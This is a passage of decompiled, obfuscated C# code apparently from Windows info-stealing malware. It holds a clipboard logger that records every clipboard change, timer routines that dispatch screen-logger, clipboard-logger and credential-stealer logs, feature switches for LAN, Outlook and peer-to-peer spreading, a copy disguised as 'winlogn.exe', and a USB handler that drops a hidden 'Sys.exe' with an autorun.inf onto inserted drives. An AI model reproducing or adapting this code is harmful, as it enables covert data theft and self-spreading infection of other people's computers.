						Class34.smethod_129(text3, text2);
						goto IL_1db2;
						IL_1db2:
						num = 421;
						Class34.smethod_29();
						goto IL_1dbd;
						IL_1dbd:
						num = 422;
						vmethod_144().set_Text("Lan yes");
						goto IL_1df1;
						IL_1dd5:
						num = 424;
						goto IL_1ddb;
						IL_1ddb:
						num = 425;
						vmethod_144().set_Text("lan no ");
						goto IL_1df1;
						IL_1df1:
						num = 427;
						if (Conversions.ToBoolean(array[43]))
						{
							goto IL_1e03;
						}
						goto IL_1e2d;
						IL_1e03:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1e0a;
						IL_1e0a:
						num = 429;
						Class34.smethod_37();
						goto IL_1e15;
						IL_1e15:
						num = 430;
						vmethod_146().set_Text("Olook yes");
						goto IL_1e49;
						IL_1e2d:
						num = 432;
						goto IL_1e33;
						IL_1e33:
						num = 433;
						vmethod_146().set_Text("Olook no ");
						goto IL_1e49;
						IL_1e49:
						num = 435;
						if (Conversions.ToBoolean(array[44]))
						{
							goto IL_1e5b;
						}
						goto IL_1e8a;
						IL_1e5b:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1e62;
						IL_1e62:
						num = 437;
						Class34.smethod_50("winlogn.exe");
						goto IL_1e72;
						IL_1e72:
						num = 438;
						vmethod_148().set_Text("rar yes");
						goto IL_1ea6;
						IL_1e8a:
						num = 440;
						goto IL_1e90;
						IL_1e90:
						num = 441;
						vmethod_148().set_Text("rar no ");
						goto IL_1ea6;
						IL_1ea6:
						num = 443;
						if (Conversions.ToBoolean(array[45]))
						{
							goto IL_1eb8;
						}
						goto IL_1ee5;
						IL_1eb8:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_1ebf;
						IL_1ebf:
						num = 445;
						Class34.smethod_22();
						goto IL_1eca;
						IL_1eca:
						num = 446;
						vmethod_150().set_Text("p2p yes");
						goto end_IL_0000_3;
						end_IL_0000_2:
						break;
					}
					num = 449;
					vmethod_150().set_Text("p2p no ");
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 9764;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(object sender, EventArgs e)
	{
	}

	private void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_74, Class34.smethod_116(this), false) != 0)
		{
			vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n[------" + Class34.smethod_116(this) + "------]\r\n");
			string_74 = Class34.smethod_116(this);
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_60, ((Computer)Class1.smethod_0()).get_Clipboard().GetText(), false) != 0)
		{
			if (Conversions.ToDouble(vmethod_98().get_Text()) != 0.0)
			{
				vmethod_98().set_Text(Conversions.ToString(Conversions.ToDouble(vmethod_98().get_Text()) + 1.0));
				vmethod_130().set_Text(vmethod_130().get_Text() + "\r\n\r\nLog " + vmethod_98().get_Text() + " - " + ((Computer)Class1.smethod_0()).get_Clipboard().GetText());
				string_60 = ((Computer)Class1.smethod_0()).get_Clipboard().GetText();
			}
			else
			{
				vmethod_98().set_Text(Conversions.ToString(Conversions.ToDouble(vmethod_98().get_Text()) + 1.0));
				vmethod_130().set_Text(vmethod_130().get_Text() + "Log " + vmethod_98().get_Text() + " - " + ((Computer)Class1.smethod_0()).get_Clipboard().GetText());
				string_60 = ((Computer)Class1.smethod_0()).get_Clipboard().GetText();
			}
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		vmethod_118().set_Text("Timer 3 :-----------Started");
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-no", false) == 0))
		{
			try
			{
				vmethod_118().set_Text("Timer 3 :----------Logs");
				string_62 = "Stealers Not Selected";
				string_60 = "";
				Class34.smethod_119(this);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				vmethod_118().set_Text("Timer 3 :----------Logs");
				string_62 = "";
				string_60 = "";
				Class34.smethod_119(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				vmethod_118().set_Text("Timer 3 :-----------Logs+Stealers");
				string_60 = "";
				Class34.smethod_96(this);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				vmethod_118().set_Text("Timer 3 :-----------Logs+Stealers");
				string_60 = " ";
				Class34.smethod_96(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				vmethod_118().set_Text("Timer 3 :-----------clip+stealers");
				Class34.smethod_96(this);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				vmethod_118().set_Text("Timer 3 :-----------clip+stealers");
				Class34.smethod_96(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				vmethod_118().set_Text("+--------Screen_Ys + Cli_Ys+_Steera_Ys");
				Class34.smethod_121(this);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				vmethod_118().set_Text("+--------Screen_Ys + Cli_Ys+_Steera_Ys");
				Class34.smethod_121(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				vmethod_118().set_Text("+--------Screen_Ys + Cli_No+_Steera_Ys");
				string_60 = "";
				Class34.smethod_121(this);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				vmethod_118().set_Text("+--------Screen_Ys + Cli_No+_Steera_Ys");
				string_60 = "";
				Class34.smethod_121(this);
				ProjectData.ClearProjectError();
			}
		}
	}

	[SpecialName]
	internal virtual ManagementEventWatcher vmethod_153()
	{
		return managementEventWatcher_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_154(ManagementEventWatcher managementEventWatcher_1)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		EventArrivedEventHandler val = new EventArrivedEventHandler(method_5);
		if (managementEventWatcher_0 != null)
		{
			managementEventWatcher_0.remove_EventArrived(val);
		}
		managementEventWatcher_0 = managementEventWatcher_1;
		if (managementEventWatcher_0 != null)
		{
			managementEventWatcher_0.add_EventArrived(val);
		}
	}

	private void method_5(object sender, EventArrivedEventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		ManagementBaseObject newEvent = e.get_NewEvent();
		ManagementBaseObject val = (ManagementBaseObject)newEvent.get_Item("TargetInstance");
		string className = newEvent.get_ClassPath().get_ClassName();
		if (Operators.CompareString(className, "__InstanceCreationEvent", false) != 0)
		{
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(val.get_Item("InterfaceType"), (object)"USB", false))
		{
			string_76 = Class34.smethod_109(Conversions.ToString(val.get_Item("Name")), this);
			try
			{
				((ServerComputer)Class1.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), string_76 + "Sys.exe");
				FileSystem.FileOpen(1, string_76 + "autorun.inf", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
				FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFileInfo(string_76 + "Sys.exe").Attributes = FileAttributes.Hidden | FileAttributes.System;
				((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFileInfo(string_76 + "autorun.inf").Attributes = FileAttributes.Hidden | FileAttributes.System;
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox(RuntimeHelpers.GetObjectValue(val.get_Item("InterfaceType")), (MsgBoxStyle)0, (object)null);
	}

	private void method_6(object sender, EventArgs e)
	{
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-no", false) == 0))
		{
			try
			{
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				string_62 = "+-------- You Dont Select Stealers ------------ + ";
				Class34.smethod_141(this);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				string_62 = "+-------- You Dont Select Stealers ------------ + ";
				Class34.smethod_141(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				Class34.smethod_141(this);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				Class34.smethod_141(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-no", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				Class34.smethod_141(this);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				Class34.smethod_141(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				Class34.smethod_141(this);
				Class34.smethod_90(this);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Class34.smethod_141(this);
				Class34.smethod_90(this);
				ProjectData.ClearProjectError();
			}
		}
		if ((Operators.CompareString(vmethod_44().get_Text(), "screenlogger-Ys", false) == 0) & (Operators.CompareString(vmethod_66().get_Text(), "clipboardlogger-no", false) == 0) & (Operators.CompareString(vmethod_46().get_Text(), "stealers-Ys", false) == 0))
		{
			try
			{
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				Class34.smethod_141(this);
				Class34.smethod_90(this);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				string_60 = "+-------- You Dont Select ClipBoard Logger ";
				Class34.smethod_141(this);
				Class34.smethod_90(this);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	private void method_8(object sender, EventArgs e)
	{
	}

	private void method_9(object sender, EventArgs e)
	{
	}
}
